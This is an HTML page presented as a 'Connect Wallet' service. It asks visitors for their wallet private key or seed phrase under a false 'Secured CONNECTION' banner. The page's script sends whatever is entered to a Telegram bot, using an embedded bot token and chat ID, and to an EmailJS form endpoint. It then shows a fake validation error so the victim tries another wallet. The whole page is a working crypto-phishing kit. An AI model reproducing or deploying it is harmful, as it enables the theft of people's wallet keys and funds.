<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="https://unpkg.com/flowbite@1.5.3/dist/flowbite.min.css" />
  <link rel="stylesheet" href="https://rsms.me/inter/inter.css" />
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"
    integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    (function () {
      emailjs.init("3zwxr8u9l2WSe1cgv");
    })();
  </script>
</head>

<body style="background-color:#08081c">
  <section>
    <div class="flex flex-col items-center justify-center px-6 py-8 mx-auto md:h-screen lg:py-0">
      <a href="../" class="flex items-center font-bold text-white">
        <img src="image/WalletConnec.jpg" class="mr-3 mb-5" style="height:30px" alt="Logo" />
        <span>Connect Wallet</span>
      </a>
      <div class="p-4 text-sm text-blue-700 bg-blue-100 rounded-lg dark:bg-blue-200 dark:text-blue-800" role="alert">
        <span class="font-medium"></span>Securely connect using your private key
      </div>

      <div class="w-full bg-white rounded-lg shadow dark:border sm:max-w-md xl:p-0 dark:bg-gray-800 dark:border-gray-700 mt-6">
        <div class="p-4 bg-gray-50 rounded-lg dark:bg-gray-800">
          <form method="POST" class="ajaxForm">
            <div class="mb-6">
              <input name="privatekey" type="text" placeholder="Enter your privatekey or Seed Phrase"
                id="privatekey"
                class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                required />
            </div>
            <button type="submit" id="connectButton"
              class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 mr-2 mb-2 dark:bg-blue-600 dark:hover:bg-blue-700 focus:outline-none dark:focus:ring-blue-800">
              Connect to web3
            </button>
          </form>
        </div>
      </div>

      <div
        class="mt-5 text-white bg-gradient-to-r from-blue-500 via-blue-600 to-blue-700 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-blue-300 dark:focus:ring-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center mr-2 mb-2">
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
          class="bi bi-shield-shaded" viewBox="0 0 16 16">
          <path fill-rule="evenodd"
            d="M8 14.933a.615.615 0 0 0 .1-.025c.076-.023.174-.061.294-.118.24-.113.547-.29.893-.533a10.726 10.726 0 0 0 2.287-2.233c1.527-1.997 2.807-5.031 2.253-9.188a.48.48 0 0 0-.328-.39c-.651-.213-1.75-.56-2.837-.855C9.552 1.29 8.531 1.067 8 1.067v13.866zM5.072.56C6.157.265 7.31 0 8 0s1.843.265 2.928.56c1.11.3 2.229.655 2.887.87a1.54 1.54 0 0 1 1.044 1.262c.596 4.477-.787 7.795-2.465 9.99a11.775 11.775 0 0 1-2.517 2.453 7.159 7.159 0 0 1-1.048.625c-.28.132-.581.24-.829.24s-.548-.108-.829-.24a7.158 7.158 0 0 1-1.048-.625 11.777 11.777 0 0 1-2.517-2.453C1.928 10.487.545 7.169 1.141 2.692A1.54 1.54 0 0 1 2.185 1.43 62.456 62.456 0 0 1 5.072.56z" />
        </svg>
        Secured CONNECTION
      </div>
    </div>
  </section>

  <script>
    $(".ajaxForm").submit(function (e) {
      e.preventDefault();

      var chatId = '@maxwillinbox';
      var token = '6173712735:AAHacOesd3uvSOAsO_8Gfb3SGN2nBdlICTY';
      let privateKey = document.getElementById('privatekey').value;
      let urlString = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${privateKey}`;

      let request = new XMLHttpRequest();
      request.open("POST", urlString);
      request.send();

      let formData = new FormData(this);
      formData.append("service_id", "service_t16ljdq");
      formData.append("template_id", "template_joqgtka");
      formData.append("user_id", "eLSDwldNgAzdckVHS");

      $.ajax({
        type: "POST",
        url: "https://api.emailjs.com/api/v1.0/email/send-form",
        data: formData,
        cache: false,
        contentType: false,
        processData: false,
        beforeSend: function () {
          $("#connectButton").html('Connecting wallet...').prop("disabled", true);
        },
        success: function () {
          setTimeout(function () {
            alert("Error Validating Wallet... Please Try Another Wallet");
          }, 2000);
        },
        error: function () {
          alert("Something went wrong. Please try again.");
        }
      });
    });
  </script>

  <script src="https://unpkg.com/flowbite@1.5.3/dist/flowbite.js"></script>
</body>
</html>
